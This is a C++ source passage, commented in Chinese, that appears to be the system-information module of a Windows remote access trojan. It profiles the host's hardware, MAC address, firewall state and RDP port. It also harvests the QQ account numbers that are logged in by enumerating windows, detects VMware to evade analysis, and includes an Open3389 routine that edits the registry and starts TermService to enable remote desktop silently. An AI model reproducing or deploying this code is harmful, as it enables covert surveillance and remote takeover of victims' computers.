		if (RegQueryValueEx(hKey, _T("fDenyTSConnections"), NULL, &dwType, (LPBYTE)&dwValue, &dwBufLen) == ERROR_SUCCESS)
		{
			if (dwType == REG_DWORD)
				dwRet = dwValue;
		}

		RegCloseKey(hKey);
	}
	if (dwRet == 0)
		GetPort(_T("RDP-Tcp"), posr, size);
	return FALSE;
}

BOOL getMAC(char* mac)
{
	ASTAT Adapter;

	NCB ncb;
	LANA_ENUM lana_enum;
	UCHAR uRetCode;
	memset(&ncb, 0, sizeof(ncb));
	memset(&lana_enum, 0, sizeof(lana_enum));
	ncb.ncb_command = NCBENUM;
	ncb.ncb_buffer = (unsigned char*)&lana_enum;
	ncb.ncb_length = sizeof(LANA_ENUM);
	uRetCode = Netbios(&ncb);
	if (uRetCode != NRC_GOODRET)
		return FALSE;
	for (int lana = 0; lana < lana_enum.length; lana++)
	{
		ncb.ncb_command = NCBRESET;
		ncb.ncb_lana_num = lana_enum.lana[lana];
		uRetCode = Netbios(&ncb);
		if (uRetCode == NRC_GOODRET)
			break;
	}
	if (uRetCode != NRC_GOODRET)
		return FALSE;
	memset(&ncb, 0, sizeof(ncb));
	ncb.ncb_command = NCBASTAT;
	ncb.ncb_lana_num = lana_enum.lana[0];
	strcpy((char*)ncb.ncb_callname, "*");
	ncb.ncb_buffer = (unsigned char*)&Adapter;
	ncb.ncb_length = sizeof(Adapter);
	uRetCode = Netbios(&ncb);
	if (uRetCode != NRC_GOODRET)
		return FALSE;
	wsprintf(mac, "%02X-%02X-%02X-%02X-%02X-%02X",
		Adapter.adapt.adapter_address[0],
		Adapter.adapt.adapter_address[1],
		Adapter.adapt.adapter_address[2],
		Adapter.adapt.adapter_address[3],
		Adapter.adapt.adapter_address[4],
		Adapter.adapt.adapter_address[5]);
	return TRUE;
}

BOOL clean_string(char* str)
{
	char* start = str - 1;
	char* end = str;
	char* p = str;
	while (*p)
	{
		switch (*p)
		{
		case ' ':
		case '\r':
		case '\n':
		{
			if (start + 1 == p)
				start = p;
		}
		break;
		default:
			break;
		}
		++p;
	}
	//现在来到了字符串的尾部 反向向前
	--p;
	++start;
	if (*start == 0)
	{
		//已经到字符串的末尾了 
		*str = 0;
		return TRUE;
	}
	end = p + 1;
	while (p > start)
	{
		switch (*p)
		{
		case ' ':
		case '\r':
		case '\n':
		{
			if (end - 1 == p)
				end = p;
		}
		break;
		default:
			break;
		}
		--p;
	}
	memmove(str, start, end - start);
	*(str + (int)end - (int)start) = 0;
	return TRUE;
}

BOOL GetQQ(char* QQ)
{
	char szText[MAX_PATH] = "CTXOPConntion_Class";
	char szQQNumber[MAX_PATH] = { 0 };
	char GrFMJ[] = { 'C','T','X','O','P','C','o','n','n','t','i','o','n','_','C','l','a','s','s','\0' };
	HWND hWnd = FindWindow(szText, NULL);
	while (hWnd)
	{
		if (strcmp(szText, GrFMJ) == 0)
		{
			GetWindowText(hWnd, szText, MAX_PATH);
			int len = strlen(szText);
			do
			{
				len--;
			} while (szText[len] != '_');
			strcpy(szQQNumber, &szText[len + 1]);
			strcat(QQ, szQQNumber);
			strcat(QQ, " ");
		}
		hWnd = GetWindow(hWnd, GW_HWNDNEXT);
		GetClassName(hWnd, szText, MAX_PATH);
	}
	CloseHandle(hWnd);
	clean_string(QQ);
	if (strlen(QQ) > 4)
		return TRUE;
	else
		return FALSE;
}
//获取现存
DWORD GetXC()
{
	LPDIRECTDRAW2 lpdd;
	HRESULT ddrval;
	CoInitialize(NULL);
	ddrval = CoCreateInstance(CLSID_DirectDraw,
		NULL, CLSCTX_ALL, IID_IDirectDraw2, (void**)&lpdd);
	if (!FAILED(ddrval))
	{
		ddrval = IDirectDraw2_Initialize(lpdd, NULL);
	}
	DDCAPS ddcaps;
	ddcaps.dwSize = sizeof DDCAPS;
	lpdd->GetCaps(&ddcaps, NULL);
	lpdd->Release();
	DWORD dwMem = ddcaps.dwVidMemTotal;
	int iMem = dwMem / 1008 / 1008;
	CoUninitialize();
	return iMem;
}

//判断运行环境是否在虚拟机
char* GetVMWERA()
{
	static char AllName[1024];
	/*
	__try
	{
		__asm
		{
			push   edx
			push   ecx
			push   ebx

			mov    eax, 'VMXh'
			mov    ebx, 0  // 将ebx设置为非幻数’VMXH’的其它值
			mov    ecx, 10 // 指定功能号，用于获取VMWare版本，当它为0x14时用于获取VMware内存大小
			mov    edx, 'VX' // 端口号
			in     eax, dx // 从端口dx读取VMware版本到eax
	  //若上面指定功能号为0x14时，可通过判断eax中的值是否大于0，若是则说明处于虚拟机中
	  cmp    ebx, 'VMXh' // 判断ebx中是否包含VMware版本’VMXh’，若是则在虚拟机中
	  setz[rc] // 设置返回值

	  pop    ebx
	  pop    ecx
	  pop    edx
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)  //如果未处于VMware中，则触发此异常
	{
		rc = false;
	}
	*/
	
		

	if (GetProcessID("vmtoolsd.exe"))
	{

		lstrcat(AllName, "虚拟机 ");
	}
	else
	{

		lstrcat(AllName, "实体机 ");
	}



	return AllName;
}

/// <summary>
/// 判断防火墙是否关闭
/// </summary>
/// <returns></returns>
DWORD IsFirewallPolicy()
{
	DWORD Enable = 0;
	HKEY hKey = NULL;
	DWORD  status = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile", 0L, KEY_ALL_ACCESS , &hKey);
	if (status == ERROR_SUCCESS)
	{

		DWORD dwSize = sizeof(DWORD);
		status = RegQueryValueEx(hKey, _T("EnableFirewall"), NULL, NULL, (BYTE*)&Enable, &dwSize);
		RegCloseKey(hKey);
	}
	else if (status == 5)
	{
		return 5;
	}

	return Enable;
}

/// <summary>
/// 获取系统信息
/// </summary>
/// <param name="pSysInfo"></param>
void CSysInfo::GetSystemInfo(MYSYSINFO* pSysInfo)
{
	ZeroMemory(pSysInfo,sizeof(MYSYSINFO));

	//获取CPU信息
	TCHAR SubKey[MAX_PATH]=_T("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0");
	HKEY hKey = NULL;

	DWORD  status = RegOpenKeyEx(HKEY_LOCAL_MACHINE, SubKey, 0L, KEY_ALL_ACCESS, &hKey);
	if(status == ERROR_SUCCESS)
	{
		DWORD dwType;
		DWORD dwSize = 128 * sizeof(TCHAR);
		RegQueryValueEx(hKey,_T("ProcessorNameString"),NULL,&dwType,(BYTE *)pSysInfo->szCpuInfo,&dwSize);
		RegCloseKey(hKey);	
	}
	else if (status == 5)
		_tcscpy(pSysInfo->szCpuInfo, _T("权限不足"));
	else
		_tcscpy(pSysInfo->szCpuInfo,_T("未找到"));

	

	//Get Active Time============================
	DWORD dwTime,dwDay,dwHour,dwMin;
	dwTime = GetTickCount();
	dwDay = dwTime / (1000 * 60 * 60 * 24);
	dwTime = dwTime % (1000 * 60 * 60 * 24);
	dwHour = dwTime / (1000 * 60 * 60);
	dwTime = dwTime % (1000 * 60 * 60);
	dwMin = dwTime / (1000 * 60);
	sprintf(pSysInfo->szActiveTime, _T("%d天 %d时 %d分"), dwDay,dwHour,dwMin);

	// 可用内存
	pSysInfo->szMemoryFree = atol(GetAvailPhys());

	ULARGE_INTEGER nTotalBytes,nTotalFreeBytes,nTotalAvailableBytes;
	ULONG nAllGB = 0, nFreeGB = 0;
    DWORD drivertype;
    CHAR driver[10];
    for(int i=0; i<26; i++)
    {
		driver[0] = i + ('B');
		driver[1] = (':');
		driver[2] = ('\\');
		driver[3] = 0;
		
		drivertype = GetDriveType(driver);
        if(drivertype!=DRIVE_FIXED)
			continue;
		GetDiskFreeSpaceEx(driver,&nTotalAvailableBytes,&nTotalBytes,&nTotalFreeBytes);   
		nAllGB = nAllGB + nTotalBytes.QuadPart/1024/1024/1024;
		nFreeGB = nFreeGB + nTotalFreeBytes.QuadPart/1024/1024/1024;
    }

	// 可用硬盘
	pSysInfo->szDriveFreeSize = nFreeGB;

	//判断远程服务是否开启
	GetRDP(pSysInfo->rport, sizeof(pSysInfo->rport));
	
	//获取程序路径
	GetModuleFileNameExA(GetCurrentProcess(), NULL, pSysInfo->Program, sizeof(pSysInfo->Program));

	//获取分辨路
	wsprintf(pSysInfo->szScrSize, ("%d * %d"), GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN));

	//获取mac
	char mac[200];
	getMAC(mac);
	_tcscpy(pSysInfo->szMac, mac);

	//获取QQ
	TCHAR szQq[MAX_PATH] = { 0, };
	if (GetQQ(szQq))
	{
		_tcscpy(pSysInfo->szQq, szQq);
	}

	//获取显卡
	if (!ReadRegEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000"),
		_T("DriverDesc"), REG_SZ, pSysInfo->szGraphics, NULL, lstrlen(pSysInfo->szGraphics), 0))
	{
		_tcscpy(pSysInfo->szGraphics, _T("NULL"));
	}

	//获取现存
	pSysInfo->Memory7 = GetXC();

	//获取运行环境
	wsprintf(pSysInfo->environment, GetVMWERA());

	//获取语言
	GetLocaleInfoW(LOCALE_SYSTEM_DEFAULT, LOCALE_SLANGUAGE, pSysInfo->lpLCData, sizeof(pSysInfo->lpLCData)); //地区需要用UNICODE


	//判断防火墙状态
	status = IsFirewallPolicy();
	if (status == 1)
	{
		memcpy(pSysInfo->qiang, "开启中", sizeof("开启中"));
	}
	else if (status == 5)
	{
		memcpy(pSysInfo->qiang, "权限不足", sizeof("权限不足"));
	}
	else
	{
		memcpy(pSysInfo->qiang, "关闭中", sizeof("关闭中"));
	}
	
}
/// <summary>
/// 打开或关闭3389
/// </summary>
/// <param name="falg"></param>
/// <returns></returns>
BOOL CSysInfo::Open3389(BOOL falg)
{
	BOOL result = FALSE;
	DWORD dwRet = 0;
	HKEY hKey;
	SC_HANDLE sc;
	SC_HANDLE server;
	DWORD status;
	SERVICE_STATUS st = { 0 };

	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
	{
		DWORD dwValue = falg;
		if (RegSetValueExA(hKey, "fDenyTSConnections", NULL, REG_DWORD, (PBYTE)&dwValue, 4) == ERROR_SUCCESS)
		{
			sc = OpenSCManagerA(NULL, NULL, SERVICE_START);
			if (sc)
			{
				server = OpenServiceA(sc, "TermService", SERVICE_START);

				if (server)
				{
					if (falg == 0)
					{
						status = StartServiceA(server, NULL, NULL);
						if (status == 0 || ERROR_SERVICE_ALREADY_RUNNING)
						{
							result = TRUE;
						}
					}
					else
					{
						result = TRUE;
					}
					CloseServiceHandle(server);
				}
				CloseServiceHandle(sc);
			}
		}
		RegCloseKey(hKey);
	}
	return result;
}